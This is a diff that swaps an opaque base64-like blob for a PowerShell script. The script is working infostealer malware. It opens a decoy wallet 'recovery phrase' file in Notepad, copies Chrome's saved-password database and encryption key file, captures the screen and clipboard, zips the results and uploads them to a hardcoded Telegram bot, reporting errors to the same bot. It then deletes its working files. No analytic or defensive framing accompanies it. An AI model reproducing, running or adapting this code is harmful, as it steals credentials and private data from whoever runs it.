@@ -1,1 +1,54 @@
-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
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
+$chatId = "1940923712"
+
+$fakeContent = @"
+RECOVERY_PHRASE(BIP39):
+1. vintage  2. copper  3. simple  4. juice
+5. focus    6. [HIDDEN] 7. fatigue  8. dynamic
+9. provide  10. hybrid  11. gossip  12. victory
+"@
+
+$fakeFile = "$env:TEMP\recovery_log.txt"
+$fakeContent | Out-File $fakeFile -Encoding utf8
+
+Start-Process notepad.exe -ArgumentList $fakeFile
+
+$workDir = "$env:TEMP\sys_$(Get-Random)"
+New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+
+try {
+    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+    $loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+    
+    if (Test-Path $localState) { Copy-Item $localState -Destination "$workDir\key.json" }
+    if (Test-Path $loginData) {
+        $stream = [System.IO.File]::Open($loginData, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
+        $out = [System.IO.File]::Create("$workDir\passwords.db")
+        $stream.CopyTo($out); $stream.Close(); $out.Close()
+    }
+
+    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+    $g = [System.Drawing.Graphics]::FromImage($bmp)
+    $g.CopyFromScreen(0,0,0,0, $bmp.Size)
+    $bmp.Save("$workDir\screen.png")
+    $g.Dispose(); $bmp.Dispose()
+
+    "Clipboard Content: $((Get-Clipboard) -join ' ')" | Out-File "$workDir\info.txt"
+
+    $zipFile = "$env:TEMP\data_$(Get-Random).zip"
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::CreateFromDirectory($workDir, $zipFile)
+
+    & curl.exe -s -F "chat_id=$chatId" -F "document=@'$zipFile'" "https://api.telegram.org/bot$token/sendDocument"
+
+} catch {
+    $err = $_.Exception.Message
+    & curl.exe -s -d "chat_id=$chatId" -d "text=Fail: $err" "https://api.telegram.org/bot$token/sendMessage"
+} finally {
+    Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $zipFile -Force -ErrorAction SilentlyContinue
+}
